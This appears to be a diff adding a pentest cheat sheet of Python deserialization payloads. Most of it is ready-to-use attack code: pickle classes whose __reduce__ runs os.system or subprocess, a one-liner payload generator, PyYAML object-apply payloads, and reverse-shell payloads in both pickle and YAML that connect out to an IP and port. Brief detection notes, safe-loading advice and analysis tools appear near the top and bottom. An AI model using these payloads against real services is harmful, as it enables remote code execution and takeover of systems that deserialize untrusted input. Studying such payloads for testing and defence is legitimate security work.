@@ -1,0 +1,66 @@
+# Python Deserialization Payloads (Pickle)
+
+# ============ Detection ============
+# Look for: pickle.loads(), pickle.load(), cPickle
+# Pickle magic bytes: \x80\x03 or \x80\x04 (protocol 3/4)
+
+# ============ Basic RCE Payload ============
+import pickle
+import os
+import base64
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = pickle.dumps(Exploit())
+print(base64.b64encode(payload).decode())
+
+# ============ Reverse Shell ============
+import pickle
+import os
+import base64
+
+class ReverseShell:
+    def __reduce__(self):
+        cmd = 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"'
+        return (os.system, (cmd,))
+
+payload = pickle.dumps(ReverseShell())
+print(base64.b64encode(payload).decode())
+
+# ============ Using subprocess ============
+import pickle
+import subprocess
+import base64
+
+class Exploit:
+    def __reduce__(self):
+        return (subprocess.check_output, (['id'],))
+
+payload = pickle.dumps(Exploit())
+print(base64.b64encode(payload).decode())
+
+# ============ One-liner Generator ============
+python3 -c "import pickle,base64,os;print(base64.b64encode(pickle.dumps(type('x',(object,),{'__reduce__':lambda s:(os.system,('id',))})())).decode())"
+
+# ============ YAML Deserialization (PyYAML) ============
+# yaml.load() with Loader=Loader or without Loader arg is vulnerable
+!!python/object/apply:os.system ['id']
+!!python/object/apply:subprocess.check_output [['id']]
+!!python/object/new:subprocess.check_output [['id']]
+
+# Reverse shell via YAML
+!!python/object/apply:os.system ['bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"']
+
+# ============ Safe alternatives (not exploitable) ============
+# yaml.safe_load() - Safe
+# pickle with restricted unpickler - Safer (but can still be bypassed)
+
+# ============ Tools ============
+# Pickletools for analysis:
+python3 -m pickletools payload.pkl
+
+# Fickling - Pickle decompiler and analyzer
+# https://github.com/trailofbits/fickling
+fickling payload.pkl
